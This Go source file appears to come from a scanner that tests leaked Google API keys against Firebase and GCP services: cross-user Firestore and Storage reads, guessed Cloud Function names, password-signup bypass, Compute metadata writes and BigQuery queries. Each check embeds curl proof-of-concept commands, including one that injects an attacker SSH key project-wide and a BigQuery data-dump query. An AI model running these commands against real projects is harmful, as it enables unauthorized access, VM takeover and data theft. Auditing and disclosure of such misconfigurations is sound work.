package analyzer

import (
	"bytes"
	"context"
	"fmt"
	"io"
	"net/http"
	"strings"
	"sync"
	"time"
)

// This file groups the "chain-of-trust" and "second-hop" probes that go
// beyond the basic per-API checks:
//
//   - checkFirestoreUserDocs   — uses the anonymous JWT's UID against common
//                                user-collection patterns; catches both
//                                self-doc-only and cross-user-doc misconfigs
//   - checkStorageUserFolders  — Storage equivalent of the above, listing
//                                user-scoped prefixes with the anon JWT
//   - checkFunctionsCallable   — Firebase HTTPS Callable Functions accept an
//                                idToken in their context; probes common
//                                function names for "callable but auth=null"
//                                misconfigs
//   - checkPasswordAuthBypass  — when email/password signup is open, mints a
//                                second identity and re-probes the
//                                Security-Rules surfaces with that JWT
//                                (different rules may apply to anonymous vs
//                                password-authenticated users)
//   - checkComputeMetadataWrite — write-probe for setCommonInstanceMetadata
//                                 (the highest-impact possible finding: SSH
//                                 access to every VM in the project). Sends a
//                                 deliberately-wrong fingerprint so the API
//                                 can't actually accept the write; parses 412
//                                 vs 403 to tell us whether the write would
//                                 have been allowed
//   - checkBigQueryQuery       — submits a dry-run SELECT; success means real
//                                queries (data exfil) are possible

// ─── Firestore user-doc probes (A1 + A2) ────────────────────────────────────

var commonFirestoreUserCollections = []string{
	"users", "Users", "accounts", "profiles", "members", "userProfiles",
}

// commonGuessedUIDs are the user IDs we attempt to read cross-user. "admin",
// "test", "0", "1" are extremely common when rules are misconfigured to
// `if request.auth != null` instead of `if request.auth.uid == uid`.
var commonGuessedUIDs = []string{"admin", "test", "0", "1", "root", "system", "owner"}

func firestoreReadDoc(escKey, projectID, docPath, idToken string) bool {
	u := fmt.Sprintf(
		"https://firestore.googleapis.com/v1/projects/%s/databases/(default)/documents/%s?key=%s",
		projectID, docPath, escKey,
	)
	headers := map[string]string{}
	if idToken != "" {
		headers["Authorization"] = "Bearer " + idToken
	}
	code, body, err := doCustomCtx(context.Background(), "GET", u, nil, headers)
	if err != nil || code != 200 {
		return false
	}
	// 200 with a real doc has a "fields" key. Empty/non-existent docs return
	// 404 instead, which we already excluded above.
	return strings.Contains(string(body), `"fields"`)
}

func checkFirestoreUserDocs() ServiceCheck {
	return ServiceCheck{
		Desc: "Using an anonymous-signup token, the key can read another user's Firestore documents — Security Rules fail to scope reads to the owner, a horizontal-access (IDOR) flaw.",
		Name: "Firestore User Document Access (Auth Bypass)", Category: "Firebase", NeedsProject: true, NeedsAuth: true,
		PoC: `# 1. Get an idToken via anonymous signup
TOKEN=$(curl -s -X POST 'https://identitytoolkit.googleapis.com/v1/accounts:signUp?key={KEY}' -H 'Content-Type: application/json' -d '{"returnSecureToken":true}' | jq -r .idToken)
UID=$(echo "${TOKEN}" | awk -F. '{print $2}' | base64 -d 2>/dev/null | jq -r .sub)
# 2. Read your OWN user doc (common pattern: match /users/{uid} allow read: if request.auth.uid == uid;)
curl -s "https://firestore.googleapis.com/v1/projects/{PROJECT}/databases/(default)/documents/users/${UID}?key={KEY}" -H "Authorization: Bearer ${TOKEN}"
# 3. Read someone ELSE's user doc — succeeds only when rules use the weak "request.auth != null" pattern
curl -s "https://firestore.googleapis.com/v1/projects/{PROJECT}/databases/(default)/documents/users/admin?key={KEY}" -H "Authorization: Bearer ${TOKEN}"`,
		RunAuth: func(key, projectID, idToken string) CheckResult {
			uid := extractUIDFromJWT(idToken)
			if uid == "" {
				return cr("Firestore User Document Access (Auth Bypass)", "Firebase", StatusForbidden,
					"Could not extract UID from idToken — skipping user-doc probe", nil)
			}
			var selfHits []string
			var crossHits []string
			// Build (collection, uid) pairs and probe them in parallel.
			type probe struct {
				col   string
				uid   string
				label string
				self  bool
			}
			var probes []probe
			for _, col := range commonFirestoreUserCollections {
				probes = append(probes, probe{col: col, uid: uid, label: col + "/<our_uid>", self: true})
				for _, guess := range commonGuessedUIDs {
					probes = append(probes, probe{col: col, uid: guess, label: col + "/" + guess, self: false})
				}
			}
			var mu sync.Mutex
			parallelProbe(probes, 8, func(p probe) {
				if !firestoreReadDoc(key, projectID, p.col+"/"+p.uid, idToken) {
					return
				}
				mu.Lock()
				defer mu.Unlock()
				if p.self {
					selfHits = append(selfHits, p.label)
				} else {
					crossHits = append(crossHits, p.label)
				}
			})
			if len(crossHits) > 0 {
				return cr("Firestore User Document Access (Auth Bypass)", "Firebase", StatusConfirmed,
					"Cross-user Firestore docs readable (rules use `request.auth != null` not `request.auth.uid == uid`): "+strings.Join(crossHits, ", "), nil)
			}
			if len(selfHits) > 0 {
				return cr("Firestore User Document Access (Auth Bypass)", "Firebase", StatusPotential,
					"Own-user doc readable: "+strings.Join(selfHits, ", ")+" — confirms /collection/{uid} structure exists; try with real UIDs harvested from the app", nil)
			}
			return cr("Firestore User Document Access (Auth Bypass)", "Firebase", StatusForbidden,
				"No common user-doc paths readable (either no such collection or rules deny)", nil)
		},
	}
}

// ─── Storage user-folder probes (A4) ────────────────────────────────────────

func storagePrefixHasItems(escKey, bucket, prefix, idToken string) bool {
	status, n, _ := storageListPrefix(escKey, bucket, prefix, idToken)
	return status == StatusConfirmed && n > 0
}

func checkStorageUserFolders() ServiceCheck {
	return ServiceCheck{
		Desc: "Using an anonymous-signup token, the key can read other users' Storage folders — rules fail to scope objects to the owner (IDOR).",
		Name: "Storage User Folder Access (Auth Bypass)", Category: "Firebase", NeedsProject: true, NeedsAuth: true,
		PoC: `# 1. Get the idToken + UID
TOKEN=$(curl -s -X POST 'https://identitytoolkit.googleapis.com/v1/accounts:signUp?key={KEY}' -H 'Content-Type: application/json' -d '{"returnSecureToken":true}' | jq -r .idToken)
UID=$(echo "${TOKEN}" | awk -F. '{print $2}' | base64 -d 2>/dev/null | jq -r .sub)
# 2. List your own user-scoped folder
curl -s "https://firebasestorage.googleapis.com/v0/b/{PROJECT}.appspot.com/o?prefix=users/${UID}/" -H "Authorization: Bearer ${TOKEN}"
# 3. Try someone else's
curl -s "https://firebasestorage.googleapis.com/v0/b/{PROJECT}.appspot.com/o?prefix=users/admin/" -H "Authorization: Bearer ${TOKEN}"`,
		RunAuth: func(key, projectID, idToken string) CheckResult {
			uid := extractUIDFromJWT(idToken)
			if uid == "" {
				return cr("Storage User Folder Access (Auth Bypass)", "Firebase", StatusForbidden,
					"Could not extract UID from idToken", nil)
			}
			buckets := []string{projectID + ".appspot.com", projectID + ".firebasestorage.app"}
			patterns := []string{"users/", "profile_photos/", "uploads/", ""}
			var selfHits []string
			var crossHits []string
			var workingBucket string
			// Probe each (bucket, prefix-base, uid) combination in parallel
			// per bucket. The first bucket with any hit wins (mirrors the
			// existing sequential behavior).
			type probe struct {
				prefix string
				label  string
				self   bool
			}
			var probes []probe
			for _, base := range patterns {
				probes = append(probes, probe{prefix: base + uid + "/", label: base + "<our_uid>/", self: true})
				for _, guess := range commonGuessedUIDs {
					probes = append(probes, probe{prefix: base + guess + "/", label: base + guess + "/", self: false})
				}
			}
			for _, bucket := range buckets {
				var localSelf, localCross []string
				var mu sync.Mutex
				parallelProbe(probes, 8, func(p probe) {
					if !storagePrefixHasItems(key, bucket, p.prefix, idToken) {
						return
					}
					mu.Lock()
					defer mu.Unlock()
					if p.self {
						localSelf = append(localSelf, p.label)
					} else {
						localCross = append(localCross, p.label)
					}
				})
				if len(localSelf) > 0 || len(localCross) > 0 {
					workingBucket = bucket
					selfHits = localSelf
					crossHits = localCross
					break
				}
			}
			if len(crossHits) > 0 {
				return cr("Storage User Folder Access (Auth Bypass)", "Firebase", StatusConfirmed,
					fmt.Sprintf("Cross-user Storage folders readable on %s (rules don't gate on uid): %s",
						workingBucket, strings.Join(crossHits, ", ")), nil)
			}
			if len(selfHits) > 0 {
				return cr("Storage User Folder Access (Auth Bypass)", "Firebase", StatusPotential,
					fmt.Sprintf("Own-user folder readable on %s: %s — confirms uid-scoped layout",
						workingBucket, strings.Join(selfHits, ", ")), nil)
			}
			return cr("Storage User Folder Access (Auth Bypass)", "Firebase", StatusForbidden,
				"No user-scoped Storage prefix is readable", nil)
		},
	}
}

// ─── Cloud Functions onCall probe (A3) ──────────────────────────────────────

// commonCallableFunctionNames is biased toward HTTPS Callable Functions which
// typically wrap admin actions (sending email/SMS, changing roles, etc.).
var commonCallableFunctionNames = []string{
	// User/account operations
	"getUser", "getUsers", "createUser", "deleteUser", "updateUser",
	"changeEmail", "changePassword", "resetPassword",
	"setRole", "setAdmin", "promoteUser", "demoteUser",
	// Messaging / comms
	"sendEmail", "sendSms", "sendNotification", "sendVerification",
	"sendMessage", "notify",
	// Payment / commerce
	"processPayment", "createCharge", "refund", "createSubscription", "cancelSubscription",
	"createOrder", "completeCheckout",
	// Data / admin
	"exportData", "importData", "deleteAllData",
	"healthCheck", "ping", "status",
	// Generic / discoverable
	"api", "call", "invoke", "execute", "run",
}

func checkFunctionsCallable() ServiceCheck {
	return ServiceCheck{
		Desc: "An onCall Cloud Function is invocable with this key/anonymous session, letting an attacker reach server-side logic without proper authorization.",
		Name: "Callable Cloud Function Invocation", Category: "GCP", NeedsProject: true, NeedsAuth: true,
		PoC: `# 1. Get an idToken
TOKEN=$(curl -s -X POST 'https://identitytoolkit.googleapis.com/v1/accounts:signUp?key={KEY}' -H 'Content-Type: application/json' -d '{"returnSecureToken":true}' | jq -r .idToken)
# 2. Replace FUNC_NAME with one of the hits in the detail
curl -s -X POST 'https://us-central1-{PROJECT}.cloudfunctions.net/FUNC_NAME' -H 'Content-Type: application/json' -H "Authorization: Bearer ${TOKEN}" -d '{"data":{}}'`,
		RunAuth: func(key, projectID, idToken string) CheckResult {
			// Quick host-probe: if DNS doesn't resolve, there's no Gen-1 functions
			// deployment in us-central1 and we can bail early.
			probeURL := fmt.Sprintf("https://us-central1-%s.cloudfunctions.net/aiza-no-such-function", projectID)
			if _, _, err := doGet(probeURL); err != nil {
				return cr("Callable Cloud Function Invocation", "GCP", StatusForbidden,
					"No Gen-1 Cloud Functions deployment in us-central1", nil)
			}
			var executed []string
			var authPassed []string
			var existsAuthRejected []string
			var mu sync.Mutex
			parallelProbe(commonCallableFunctionNames, 8, func(name string) {
				u := fmt.Sprintf("https://us-central1-%s.cloudfunctions.net/%s", projectID, name)
				ctx, cancel := context.WithTimeout(context.Background(), Client.Timeout)
				defer cancel()
				body := []byte(`{"data":{}}`)
				req, err := http.NewRequestWithContext(ctx, "POST", u, bytes.NewReader(body))
				if err != nil {
					return
				}
				req.Header.Set("Content-Type", "application/json")
				req.Header.Set("Authorization", "Bearer "+idToken)
				req.Header.Set("User-Agent", "aiza-key-analyzer/1.0")
				resp, err := Client.Do(req)
				if err != nil {
					return
				}
				respBody, _ := io.ReadAll(resp.Body)
				resp.Body.Close()
				if resp.StatusCode == 404 {
					return
				}
				bodyStr := string(respBody)
				mu.Lock()
				defer mu.Unlock()
				if resp.StatusCode == 200 {
					if strings.Contains(bodyStr, `"result"`) {
						executed = append(executed, name+" (executed)")
						return
					}
					switch {
					case strings.Contains(bodyStr, "INVALID_ARGUMENT"):
						authPassed = append(authPassed, name+" (auth accepted, args rejected)")
					case strings.Contains(bodyStr, "UNAUTHENTICATED"):
						existsAuthRejected = append(existsAuthRejected, name+" (UNAUTHENTICATED)")
					case strings.Contains(bodyStr, "PERMISSION_DENIED"):
						existsAuthRejected = append(existsAuthRejected, name+" (PERMISSION_DENIED)")
					default:
						existsAuthRejected = append(existsAuthRejected, name+" (200 / unknown)")
					}
				} else if resp.StatusCode == 401 || resp.StatusCode == 403 || resp.StatusCode == 405 {
					existsAuthRejected = append(existsAuthRejected, fmt.Sprintf("%s (HTTP %d)", name, resp.StatusCode))
				}
			})
			if len(executed) > 0 || len(authPassed) > 0 {
				both := append([]string{}, executed...)
				both = append(both, authPassed...)
				detail := "Callable functions reachable with anonymous JWT: " + strings.Join(both, ", ")
				if len(existsAuthRejected) > 0 {
					detail += " | Also present (auth-rejected): " + strings.Join(existsAuthRejected, ", ")
				}
				return cr("Callable Cloud Function Invocation", "GCP", StatusConfirmed, detail, nil)
			}
			if len(existsAuthRejected) > 0 {
				return cr("Callable Cloud Function Invocation", "GCP", StatusPotential,
					"Callable functions present but reject anonymous JWT: "+strings.Join(existsAuthRejected, ", ")+" — retry with a real user JWT if you have one", nil)
			}
			return cr("Callable Cloud Function Invocation", "GCP", StatusForbidden,
				"us-central1 has Gen-1 functions but none of the common callable names matched", nil)
		},
	}
}

// ─── Password-auth bypass chain (B1) ────────────────────────────────────────

// checkPasswordAuthBypass creates a real email/password account, then re-probes
// Firestore/RTDB/Storage with the resulting JWT. Some projects' Security
// Rules trust password-authenticated users more than anonymous ones (e.g.
// `request.auth.token.firebase.sign_in_provider == "password"`). When that's
// the case, this surfaces access the anonymous-JWT probes can't reach.
// Always deletes the created account on the way out.
func checkPasswordAuthBypass() ServiceCheck {
	return ServiceCheck{
		Desc: "A self-registered email/password identity reaches Security-Rules surfaces the anonymous session cannot, exposing data gated on password-provider auth.",
		Name: "Password Authentication Bypass", Category: "Firebase", NeedsProject: true,
		PoC: `# 1. Create a password account and capture its idToken
EMAIL="aiza-poc-$(date +%s)@no.invalid"; PASS="AizaPocAbc12345!"
RESP=$(curl -s -X POST 'https://identitytoolkit.googleapis.com/v1/accounts:signUp?key={KEY}' -H 'Content-Type: application/json' -d "{\"email\":\"${EMAIL}\",\"password\":\"${PASS}\",\"returnSecureToken\":true}")
TOKEN=$(echo "${RESP}" | jq -r .idToken); UID=$(echo "${RESP}" | jq -r .localId)
# 2. Use it against Firestore root listing (etc.) — see Firestore/RTDB/Storage PoCs above
curl -s -X POST "https://firestore.googleapis.com/v1/projects/{PROJECT}/databases/(default)/documents:listCollectionIds?key={KEY}" -H "Authorization: Bearer ${TOKEN}" -H "Content-Type: application/json" -d '{"pageSize":100}'
# 3. Cleanup
curl -s -X POST 'https://identitytoolkit.googleapis.com/v1/accounts:delete?key={KEY}' -H 'Content-Type: application/json' -d "{\"idToken\":\"${TOKEN}\"}"`,
		Run: func(key, projectID string) CheckResult {
			// 1. Sign up an email/password user (we need a fresh distinct identity)
			email := fmt.Sprintf("aiza-pwauth-%d@no.invalid", time.Now().UnixNano())
			signupURL := "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=" + key
			code, body, err := doPost(signupURL, map[string]interface{}{
				"email":             email,
				"password":          "AizaPwauthAbc12345!",
				"returnSecureToken": true,
			})
			if err != nil {
				return cr("Password Authentication Bypass", "Firebase", StatusError, err.Error(), nil)
			}
			if code != 200 {
				// Distinguish the secure-by-config case from a key-restriction
				// case. OPERATION_NOT_ALLOWED / PASSWORD_LOGIN_DISABLED means
				// email+password sign-in is explicitly turned off in Firebase
				// Auth settings — the bypass chain literally cannot exist here,
				// which is the desired hardened state (NOT VULNERABLE, not
				// FORBIDDEN). EMAIL_ENUMERATION_PROTECTION_ENABLED is the
				// modern (post-2023-09-15) shield that suppresses signup-side
				// confirmations; the chain isn't testable through this path,
				// so we mark it NOT VULNERABLE too. Anything else means the
				// key was rejected for unrelated reasons (FORBIDDEN).
				bodyStr := string(body)
				if code == 400 && (strings.Contains(bodyStr, "OPERATION_NOT_ALLOWED") || strings.Contains(bodyStr, "PASSWORD_LOGIN_DISABLED")) {
					return cr("Password Authentication Bypass", "Firebase", StatusNotVulnerable,
						"Email/password sign-in is disabled in project — bypass chain not applicable (this is the secure config)", body)
				}
				if code == 400 && strings.Contains(bodyStr, "EMAIL_ENUMERATION_PROTECTION_ENABLED") {
					return cr("Password Authentication Bypass", "Firebase", StatusNotVulnerable,
						"Email Enumeration Protection blocks signup confirmations — bypass chain not testable via this path", body)
				}
				return cr("Password Authentication Bypass", "Firebase", StatusForbidden,
					"Email/password signup denied — chain not applicable here (see Email/Password Signup row)", body)
			}
			var resp struct {
				IDToken string `json:"idToken"`
				LocalID string `json:"localId"`
			}
			unmarshal(body, &resp)
			if resp.IDToken == "" {
				return cr("Password Authentication Bypass", "Firebase", StatusForbidden,
					"Signup returned 200 without an idToken", body)
			}
			// Always cleanup
			defer func() {
				_, _, _ = doPost(
					"https://identitytoolkit.googleapis.com/v1/accounts:delete?key="+key,
					map[string]interface{}{"idToken": resp.IDToken},
				)
			}()

			var hits []string

			// Firestore root listing
			firestoreCR := firestoreListCollections(key, projectID, resp.IDToken)
			if firestoreCR.Status == StatusConfirmed {
				hits = append(hits, "Firestore listCollectionIds: "+firestoreCR.Detail)
			}
			// RTDB root
			rtdbCR, host := rtdbProbe(projectID, resp.IDToken, "auth")
			if rtdbCR.Status == StatusConfirmed {
				hits = append(hits, "RTDB "+host+": "+rtdbCR.Detail)
			}
			// Storage root listing
			sStatus, sDetail, _, _ := firebaseStorageList(key, projectID, resp.IDToken)
			if sStatus == StatusConfirmed {
				hits = append(hits, "Storage: "+sDetail)
			}

			if len(hits) > 0 {
				return cr("Password Authentication Bypass", "Firebase", StatusConfirmed,
					"Email/password-authenticated user accesses: "+strings.Join(hits, " | ")+" — compare against the anonymous-JWT rows above; any surface that anonymous CAN'T reach is exclusively reachable via password auth", nil)
			}
			return cr("Password Authentication Bypass", "Firebase", StatusNotVulnerable,
				"Email/password JWT does not unlock additional Security-Rules surfaces beyond anonymous", nil)
		},
	}
}

// ─── Compute setCommonInstanceMetadata write probe (C1) ─────────────────────

func checkComputeMetadataWrite() ServiceCheck {
	return ServiceCheck{
		Desc: "setCommonInstanceMetadata is callable, so an attacker can write project-wide SSH keys and gain SSH on every VM in the project — full compute takeover.",
		Name: "Compute Project Metadata Write (SSH Key Injection)", Category: "GCP", NeedsProject: true,
		PoC: `# 1. Read the current fingerprint
FP=$(curl -s 'https://compute.googleapis.com/compute/v1/projects/{PROJECT}?key={KEY}' | jq -r .commonInstanceMetadata.fingerprint)
# 2. Set ssh-keys metadata with YOUR public key — this grants you SSH to every VM in the project
PUBKEY="ssh-rsa AAAA...your_key... attacker"
curl -s -X POST 'https://compute.googleapis.com/compute/v1/projects/{PROJECT}/setCommonInstanceMetadata?key={KEY}' -H 'Content-Type: application/json' -d "{\"fingerprint\":\"${FP}\",\"items\":[{\"key\":\"ssh-keys\",\"value\":\"attacker:${PUBKEY}\"}]}"`,
		Run: func(key, projectID string) CheckResult {
			// Send a deliberately-wrong fingerprint. The API can never accept
			// this write — but a 412 (precondition failed) tells us the
			// permission check passed and only the fingerprint was wrong; a
			// 403/401 tells us our key isn't allowed to write metadata at all.
			u := fmt.Sprintf(
				"https://compute.googleapis.com/compute/v1/projects/%s/setCommonInstanceMetadata?key=%s",
				projectID, key,
			)
			body := []byte(`{"fingerprint":"AAAAAAAAAAAAAAAAAAAAAA==","items":[]}`)
			code, respBody, err := doRequestCtx(context.Background(), "POST", u, body)
			if err != nil {
				return cr("Compute Project Metadata Write (SSH Key Injection)", "GCP", StatusError, err.Error(), nil)
			}
			if code == 412 {
				return cr("Compute Project Metadata Write (SSH Key Injection)", "GCP", StatusConfirmed,
					"setCommonInstanceMetadata is callable (412 fingerprint-mismatch = permission granted, only the fingerprint was wrong). Writing ssh-keys here grants SSH to every VM in the project.", respBody)
			}
			if code == 200 {
				// Shouldn't happen with our junk fingerprint, but if it does the API accepted it.
				return cr("Compute Project Metadata Write (SSH Key Injection)", "GCP", StatusConfirmed,
					"setCommonInstanceMetadata accepted (unexpected 200 with bogus fingerprint). Project metadata is writable.", respBody)
			}
			if code == 400 {
				// Could be malformed fingerprint, but more often "fingerprint
				// invalid" is reported as 412. A 400 with our body shape
				// usually means the API rejected the request before checking
				// permissions; treat as Forbidden.
				if isInvalidKeyResponse(respBody) {
					return cr("Compute Project Metadata Write (SSH Key Injection)", "GCP", StatusForbidden,
						"Key rejected for Compute Engine API", respBody)
				}
				return cr("Compute Project Metadata Write (SSH Key Injection)", "GCP", StatusForbidden,
					"setCommonInstanceMetadata rejected the request (HTTP 400) — permission check inconclusive", respBody)
			}
			if code == 401 || code == 403 {
				return cr("Compute Project Metadata Write (SSH Key Injection)", "GCP", StatusForbidden,
					"setCommonInstanceMetadata denied — key cannot write project metadata", respBody)
			}
			return httpError("Compute Project Metadata Write (SSH Key Injection)", "GCP", code, respBody)
		},
	}
}

// ─── BigQuery dry-run query (C2) ────────────────────────────────────────────

func checkBigQueryQuery() ServiceCheck {
	return ServiceCheck{
		Desc: "The key holds bigquery.jobs.create and can run arbitrary SQL, enabling full data exfiltration from every table the project's BigQuery service account can read.",
		Name: "BigQuery Arbitrary Query Execution", Category: "GCP", NeedsProject: true,
		PoC: `# 1. Confirm query capability with a free dry-run (no charge)
curl -s -X POST 'https://bigquery.googleapis.com/bigquery/v2/projects/{PROJECT}/queries?key={KEY}' -H 'Content-Type: application/json' -d '{"query":"SELECT 1","dryRun":true,"useLegacySql":false}'
# 2. List datasets
curl -s 'https://bigquery.googleapis.com/bigquery/v2/projects/{PROJECT}/datasets?key={KEY}'
# 3. List tables in a dataset
curl -s 'https://bigquery.googleapis.com/bigquery/v2/projects/{PROJECT}/datasets/DATASET/tables?key={KEY}'
# 4. Run a real query (incurs charge); the backticks around the table name are required by BigQuery Standard SQL when the project ID has hyphens
curl -s -X POST 'https://bigquery.googleapis.com/bigquery/v2/projects/{PROJECT}/queries?key={KEY}' -H 'Content-Type: application/json' -d '{"query":"SELECT * FROM ` + "`" + `{PROJECT}.DATASET.TABLE` + "`" + ` LIMIT 10","useLegacySql":false}'`,
		Run: func(key, projectID string) CheckResult {
			u := fmt.Sprintf("https://bigquery.googleapis.com/bigquery/v2/projects/%s/queries?key=%s", projectID, key)
			payload := map[string]interface{}{
				"query":        "SELECT 1",
				"dryRun":       true,
				"useLegacySql": false,
			}
			code, body, err := doPost(u, payload)
			if err != nil {
				return cr("BigQuery Arbitrary Query Execution", "GCP", StatusError, err.Error(), nil)
			}
			if code == 200 {
				return cr("BigQuery Arbitrary Query Execution", "GCP", StatusConfirmed,
					"BigQuery dry-run SELECT succeeded — key has bigquery.jobs.create permission and can run arbitrary SQL (full data-exfil capability against every table the project's BigQuery service account can read)", body)
			}
			if code == 401 || code == 403 {
				return cr("BigQuery Arbitrary Query Execution", "GCP", StatusForbidden, "Key denied for BigQuery queries", body)
			}
			if code == 400 && isInvalidKeyResponse(body) {
				return cr("BigQuery Arbitrary Query Execution", "GCP", StatusForbidden, "Key rejected for BigQuery", body)
			}
			return httpError("BigQuery Arbitrary Query Execution", "GCP", code, body)
		},
	}
}
